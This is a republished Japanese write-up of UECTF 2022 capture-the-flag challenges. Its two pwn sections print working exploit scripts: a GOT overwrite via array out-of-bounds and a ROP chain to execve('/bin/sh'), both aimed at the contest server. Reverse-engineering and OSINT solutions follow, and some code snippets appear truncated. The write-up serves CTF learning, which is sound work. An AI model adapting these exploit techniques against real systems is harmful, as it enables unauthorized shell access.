---
title: UECTF 2022のWriteup
url: https://buaq.net/go-136489.html
source: unSafe.sh - 不安全
date: 2022-11-21
fetch_date: 2025-10-03T23:18:48.711979
---

# UECTF 2022のWriteup

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/be1a5e037de089bfefc6bedf0ba0ac5e.jpg)

UECTF 2022のWriteup

初心者〜中級者向けというCakeCT
*2022-11-20 20:53:16
Author: [ptr-yudai.hatenablog.com(查看原文)](/jump-136489.htm)
阅读量:57
收藏*

---

初心者〜中級者向けというCakeCTFポジションのCTFがTLに流れてきました。

> — UECTF (@[uec](http://d.hatena.ne.jp/keyword/uec)\_ctf) [November 17, 2022](https://twitter.com/uec_ctf/status/1593262746875105280?ref_src=twsrc%5Etfw)

ずんだもん（肩幅が広い方）に参加していただき、無事優勝されたようです。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20221120/20221120211051.png)

st98さんに教えてもらったサービスで名前をキラキラ女子風にした

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20221120/20221120220454.png)

♡リンクを踏むと素敵な音声が聴けます♡

問題数が多いので最終的に400点以上になった問題だけ書きます。

* [[pwn] rot13](#pwn-rot13)
* [[pwn] buffer\_overflow\_2](#pwn-buffer_overflow_2)
* [[rev] discrete](#rev-discrete)
* [[rev] dotnet](#rev-dotnet)
* [[misc] WHEREAMI](#misc-WHEREAMI)
* [[misc] OSINT](#misc-OSINT)

配列OOBがあるので用意したデータをポインタとして読み書きできます。おしまい。

```
from ptrlib import *

def create(index, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", data)
def run(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
def edit(index, data):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", data)

sock = Socket("uectf.uec.tokyo", 9003)
libc = ELF("./libc-2.31.so")
elf = ELF("./chall")

sock.sendlineafter(": ", b"A"*8)

create(0, p64(elf.got("puts")))
show(-6)
libc.set_base(u64(sock.recvline()) - libc.symbol("puts"))

edit(-6, p64(libc.symbol("system")))

create(1, b"/bin/sh\0")
show(1)

sock.sh()
```

ROPするだけ問題。
最初書き込めるROP chainが少ないですが、一度readを読んでROP chainを伸ばせばOKです。

```
from ptrlib import *
import time

elf = ELF("./chall")
sock = Socket("nc uectf.uec.tokyo 9002")

payload  = b"A" * 0x68
payload += p64(next(elf.gadget("pop rdx; ret")))
payload += p64(0x200)
payload += p64(elf.symbol("read"))
sock.sendafter("> ", payload)

time.sleep(0.5)
addr_binsh = elf.section(".bss") + 0x800
payload += flat([
    next(elf.gadget("pop rsi; ret")),
    addr_binsh,
    elf.symbol("read"),

    next(elf.gadget("pop rdx; ret")), 0,
    next(elf.gadget("pop rsi; ret")), 0,
    next(elf.gadget("pop rdi; ret")), addr_binsh,
    next(elf.gadget("pop rax; ret")), SYS_execve['x64'],
    next(elf.gadget("syscall")),
], map=p64)
sock.send(payload)

time.sleep(0.5)
sock.send("/bin/sh\0")

sock.sh()
```

angrで良い。

```
import angr
import claripy
from logging import getLogger, WARN

getLogger("angr").setLevel(WARN + 1)
getLogger("claripy").setLevel(WARN + 1)

p = angr.Project("./chall", load_options={"auto_load_libs": False})
state = p.factory.entry_state()
simgr = p.factory.simulation_manager(state)

x = simgr.explore(find=0x40213d, avoid=(0x40200d, 0x4020f3, 0x402150))
print(x.found[0].posix.dumps(0))
```

.NET製のELFファイルをどう解析するか知りませんでしたが、どうせ.NETのことだしdllなりexeを中に持ってるんだろうなーと思ってbinwalkすると持ってました。
それをILSpyに投げると"Administrator"がパスワードであることが分かります。

```
$ ./chall_x86_64_linux
Please input password:
Administrator
UECTF{Applications-created-with-Dotnet-need-to-be-fully-protected!}
```

こんなデータが548行続いてます。何これ？

```
7RJP2C22+2222222
7RJP2G22+2222222
7VJM2C22+2222222
7VJM2G22+2222222
7RHGWW22+2222222
...
```

知らんもんは知らんので[エス](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)パータイム１に入ります。

まず548行もあるので1文字1行ではなさそうです。

次にすべてのデータが「7」から始まり「22+2222222」で終わっていることに注目します。
クソguess問ではなく既存のフォーマットのようです。
そこで、まずどのような文字列が登場するかを調べます。

```
s = set()
with open("mail.txt", "r") as f:
    for line in f:

print(s)
```

すべてで20種類の文字が登場することが分かります。
もし[base64](http://d.hatena.ne.jp/keyword/base64)のような[エンコード](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%F3%A5%B3%A1%EF%BF%BD%EF%BF%BD%EF%BF%BD)方式の場合、エンコーダはこれらの文字列を小さい順にならべて配列が文字列で持っているはずです。
そこで登場する文字列を小さい順にならべた `23456789CFGHJMPQRVWX` を検索すると、Plus Codeというコードだと分かります。
つまり、緯度経度を記憶しているようです。

[Python](http://d.hatena.ne.jp/keyword/Python)にはopenlocationcodeというライブラリがあったので使ってみましたが、なんか壊れていたので適当に修正してデータを取り出しました。

```
[ 22, 154.4 ]
[ 22, 154.5 ]
[ 22, 173.4 ]
[ 22, 173.5 ]
[ 21.9, 150.9 ]
[ 21.9, 151 ]
...
```

ASCIIコードが出ると思っていたら意味わからんのが出てきて困惑します。[エス](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)パータイム２。

知らね〜と思いつつも前後の差分が小さかったのでPILでプロットしたところ、フラグが出てきました・・・

```
from openlocationcode import decode,encode
from PIL import Image

img = Image.new("RGB", (100, 500))

flag = ""
with open("mail.txt", "r") as f:
    for line in f:
        v = decode(line).latlng()
        x, y = int(v[0] * 10) - 200, int(v[1] * 10) - 1500
        print(x, y)
        img.putpixel((x,y), (255,0,0))

        c = int()
        flag += chr(c)

img.save("test.png")
print(flag)
```

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20221120/20221120214508.png)

フラグが通らんと思っていましたが、Kは大文字でした。
画像のフラグを[case sensitive](http://d.hatena.ne.jp/keyword/case%20sensitive)にしてはいけない。

[Twitter](http://d.hatena.ne.jp/keyword/Twitter)アカウントが与えられますが削除かID変更されています。

<https://twitter.com/__yata_nano__>

ひとまず[wayback machine](http://d.hatena.ne.jp/keyword/wayback%20machine)に投げたところ、フラグはありませんが以前アカウントが存在していたころの情報が得られます。
[Twitter](http://d.hatena.ne.jp/keyword/Twitter) IDがどこにあるか分からないので、がちゃがちゃしていると次のコードで取り出せました。

```
import re

with open("test.html") as f:
    print(re.findall("id=\"(\d+)", f.read()))
```

1585261641125416961だそうです。

この番号でアカウントにアクセスすると、ユーザーID変更後のアカウントが見つかりました。

[twitter.com](https://twitter.com/ftceu)

---

文章来源: https://ptr-yudai.hatenablog.com/entry/2022/11/20/215316
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)